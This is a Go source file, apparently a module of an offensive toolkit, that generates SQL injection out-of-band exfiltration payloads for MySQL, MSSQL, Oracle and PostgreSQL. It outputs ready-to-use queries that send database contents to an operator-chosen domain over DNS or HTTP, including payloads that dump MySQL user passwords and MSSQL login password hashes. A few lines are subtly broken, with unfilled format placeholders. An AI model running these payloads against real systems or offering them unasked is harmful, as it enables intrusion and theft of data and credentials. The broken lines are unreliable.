package modules

import (
	"fmt"
	"strings"
)

type SQLiPayloadGenerator struct{}

func NewSQLiPayloadGenerator() *SQLiPayloadGenerator {
	return &SQLiPayloadGenerator{}
}

func (s *SQLiPayloadGenerator) Name() string        { return "sqli_payloads" }
func (s *SQLiPayloadGenerator) Description() string { return "Generate SQLi OOB exfiltration payloads for DNS/HTTP" }

func (s *SQLiPayloadGenerator) Run(args []string) ([]byte, error) {
	if len(args) < 2 {
		return nil, fmt.Errorf("usage: sqli_payloads <db> <domain> [query]\n  db: mysql, mssql, oracle, postgres\n  domain: your OOB domain\n  query: SQL to exfiltrate (default: SELECT @@version)")
	}

	dbType := args[0]
	domain := args[1]
	query := "SELECT @@version"
	if len(args) > 2 {
		query = strings.Join(args[2:], " ")
	}

	var payloads string
	switch strings.ToLower(dbType) {
	case "mysql":
		payloads = s.mysqlPayloads(domain, query)
	case "mssql":
		payloads = s.mssqlPayloads(domain, query)
	case "oracle":
		payloads = s.oraclePayloads(domain, query)
	case "postgres":
		payloads = s.postgresPayloads(domain, query)
	default:
		return nil, fmt.Errorf("unsupported database: %s (mysql, mssql, oracle, postgres)", dbType)
	}

	return []byte(payloads), nil
}

func (s *SQLiPayloadGenerator) mysqlPayloads(domain, query string) string {
	lines := []string{
		fmt.Sprintf("=== MySQL DNS OOB Payloads === (domain: %s)", domain),
		"",
		"# Method 1: LOAD_FILE (requires FILE privilege, Windows UNC path)",
		fmt.Sprintf("SELECT LOAD_FILE(CONCAT('\\\\\\\\', (%s), '.%s\\\\a'));", query, domain),
		"",
		"# Method 2: LOAD_FILE with subquery",
		fmt.Sprintf("SELECT LOAD_FILE(CONCAT('\\\\\\\\', database(), '.', (SELECT table_name FROM information_schema.tables LIMIT 1), '.%s\\\\a'));", domain),
		"",
		"# Method 3: DNS exfil via stored procedure (requires secure_file_priv='')",
		fmt.Sprintf("SELECT * FROM test INTO OUTFILE CONCAT('\\\\\\\\', (%s), '.%s\\\\a') LINES TERMINATED BY '';", query, domain),
		"",
		"# Method 4: Extract all tables",
		fmt.Sprintf("SELECT LOAD_FILE(CONCAT('\\\\\\\\', (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()), '.%s\\\\a'));", domain),
		"",
		"# Method 5: Extract columns from a table",
		fmt.Sprintf("SELECT LOAD_FILE(CONCAT('\\\\\\\\', (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'), '.%s\\\\a'));", domain),
		"",
		"# Method 6: Dump data",
		fmt.Sprintf("SELECT LOAD_FILE(CONCAT('\\\\\\\\', (SELECT GROUP_CONCAT(username, ':', password) FROM mysql.user), '.%s\\\\a'));", domain),
	}

	lines = append(lines, "", "# ======== HTTP OOB Payloads ========", "")
	lines = append(lines,
		"# Method 1: INTO OUTFILE with HTTP (requires FILE)",
		fmt.Sprintf("SELECT (%s) INTO OUTFILE '/var/www/html/exfil.txt';", query),
		"",
		"# Method 2: UDF DNS call",
		"SELECT sys_exec(CONCAT('nslookup ', (%s), '.%s'));",
	)

	return strings.Join(lines, "\n")
}

func (s *SQLiPayloadGenerator) mssqlPayloads(domain, query string) string {
	lines := []string{
		fmt.Sprintf("=== MSSQL DNS OOB Payloads === (domain: %s)", domain),
		"",
		"# Method 1: xp_dirtree (UNC path)",
		fmt.Sprintf("EXEC master..xp_dirtree '\\\\\\\\' + (%s) + '.%s\\\\a';", query, domain),
		"",
		"# Method 2: xp_fileexist",
		fmt.Sprintf("EXEC master..xp_fileexist '\\\\\\\\' + (%s) + '.%s\\\\a'",
			strings.ReplaceAll(query, "'", "''"), domain),
		"",
		"# Method 3: xp_subdirs",
		fmt.Sprintf("EXEC master..xp_subdirs '\\\\\\\\' + (%s) + '.%s\\\\a';", query, domain),
		"",
		"# Method 4: Extract tables",
		fmt.Sprintf("DECLARE @q VARCHAR(MAX); SET @q = (SELECT STRING_AGG(table_name, ',') FROM information_schema.tables); EXEC('master..xp_dirtree ''\\\\\\\\''+@q+''.%s\\\\a''');", domain),
		"",
		"# Method 5: Dump data with concatenation",
		fmt.Sprintf("DECLARE @d VARCHAR(MAX); SELECT @d = COALESCE(@d+',','')+name+':'+master.dbo.fn_varbintohexstr(password_hash) FROM master.sys.sql_logins; EXEC('master..xp_dirtree ''\\\\\\\\''+@d+''.%s\\\\a''');", domain),
	}

	lines = append(lines, "", "# ======== HTTP OOB Payloads ========", "")
	lines = append(lines,
		"# Method 1: OLE Automation HTTP request",
		"DECLARE @OLE INT; EXEC sp_OACreate 'MSXML2.ServerXMLHTTP', @OLE OUT;",
		fmt.Sprintf("EXEC sp_OAMethod @OLE, 'open', NULL, 'GET', 'http://%s/?data='+(%s);", domain, query),
		"EXEC sp_OAMethod @OLE, 'send';",
	)

	return strings.Join(lines, "\n")
}

func (s *SQLiPayloadGenerator) oraclePayloads(domain, query string) string {
	lines := []string{
		fmt.Sprintf("=== Oracle DNS OOB Payloads === (domain: %s)", domain),
		"",
		"# Method 1: UTL_INADDR.get_host_address",
		fmt.Sprintf("SELECT UTL_INADDR.get_host_address((%s) || '.%s') FROM dual;", query, domain),
		"",
		"# Method 2: UTL_HTTP.REQUEST (HTTP, requires ACL)",
		fmt.Sprintf("SELECT UTL_HTTP.REQUEST('http://%s/?data=' || (%s)) FROM dual;", domain, query),
		"",
		"# Method 3: DBMS_LDAP.init with DNS",
		fmt.Sprintf("SELECT DBMS_LDAP.init((SELECT banner FROM v$version WHERE ROWNUM=1) || '.%s', 80) FROM dual;", domain),
		"",
		"# Method 4: Extract all tables",
		fmt.Sprintf("SELECT UTL_INADDR.get_host_address((SELECT LISTAGG(table_name, ',') WITHIN GROUP (ORDER BY table_name) FROM all_tables WHERE ROWNUM <= 5) || '.%s') FROM dual;", domain),
	}

	return strings.Join(lines, "\n")
}

func (s *SQLiPayloadGenerator) postgresPayloads(domain, query string) string {
	lines := []string{
		fmt.Sprintf("=== PostgreSQL DNS OOB Payloads === (domain: %s)", domain),
		"",
		"# Method 1: dblink (requires dblink extension)",
		fmt.Sprintf("SELECT dblink_connect('host=' || (%s) || '.%s port=80 dbname=postgres user=postgres');", query, domain),
		"",
		"# Method 2: COPY to program (requires superuser)",
		fmt.Sprintf("COPY (SELECT (%s)) TO PROGRAM 'nslookup %s';", query, domain),
		"",
		"# Method 3: http extension",
		fmt.Sprintf("SELECT content FROM http_get('http://%s/?data=' || (%s));", domain, query),
	}

	return strings.Join(lines, "\n")
}
